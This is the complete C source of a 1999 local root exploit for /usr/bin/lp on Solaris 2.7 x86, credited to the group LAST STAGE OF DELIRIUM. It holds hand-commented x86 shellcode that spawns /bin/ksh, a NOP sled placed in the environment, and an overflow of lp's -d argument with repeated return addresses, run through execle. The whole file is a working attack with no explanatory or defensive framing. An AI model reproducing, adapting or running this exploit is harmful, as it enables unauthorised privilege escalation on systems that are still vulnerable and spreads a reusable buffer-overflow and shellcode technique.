/*## copyright LAST STAGE OF DELIRIUM jun 1999 poland        *://lsd-pl.net/ #*/
/*## /usr/bin/lp                                                             #*/

#define NOPNUM 4500
#define ADRNUM 996
#define ALLIGN 3

char shellcode[]=
    "\xeb\x1b"             /* jmp     <shellcode+30>       */
    "\x33\xd2"             /* xorl    %edx,%edx            */
    "\x58"                 /* popl    %eax                 */
    "\x8d\x78\x14"         /* leal    0x14(%eax),edi       */
    "\x52"                 /* pushl   %edx                 */
    "\x57"                 /* pushl   %edi                 */
    "\x50"                 /* pushl   %eax                 */
    "\xab"                 /* stosl   %eax,%es:(%edi)      */
    "\x92"                 /* xchgl   %eax,%edx            */
    "\xab"                 /* stosl   %eax,%es:(%edi)      */
    "\x88\x42\x08"         /* movb    %al,0x8(%edx)        */
    "\x83\xef\x3c"         /* subl    $0x3c,%edi           */
    "\xb0\x9a"             /* movb    $0x9a,%al            */
    "\xab"                 /* stosl   %eax,%es:(%edi)      */
    "\x47"                 /* incl    %edi                 */
    "\xb0\x07"             /* movb    $0x7,%al             */
    "\xab"                 /* stosl   %eax,%es:(%edi)      */
    "\xb0\x3b"             /* movb    $0x3b,%al            */
    "\xe8\xe0\xff\xff\xff" /* call    <shellcode+2>        */
    "/bin/ksh"
;

char jump[]=
    "\x8b\xc4"             /* movl    %esp,%eax            */
    "\xc3"                 /* ret                          */
;

main(int argc,char **argv){
    char buffer[10000],adr[4],*b,*envp[2];
    int i;

    printf("copyright LAST STAGE OF DELIRIUM jun 1999 poland  //lsd-pl.net/\n");
    printf("/usr/bin/lp for solaris 2.7 x86\n\n");

    *((unsigned long*)adr)=(*(unsigned long(*)())jump)()+6316+2128;

    envp[0]=&buffer[0];
    envp[1]=0;

    b=&buffer[0];
    sprintf(b,"xxx=");
    b+=4;  
    for(i=0;i<NOPNUM;i++) *b++=0x90;
    for(i=0;i<strlen(shellcode);i++) *b++=shellcode[i];
    *b=0;

    b=&buffer[5000];
    *b++=':';
    for(i=0;i<ALLIGN;i++) *b++=0xff;
    for(i=0;i<ADRNUM;i++) *b++=adr[i%4];
    *b=0;

    execle("/usr/bin/lp","lp","-d",&buffer[5000],"-p","/bin/sh",0,envp);
}

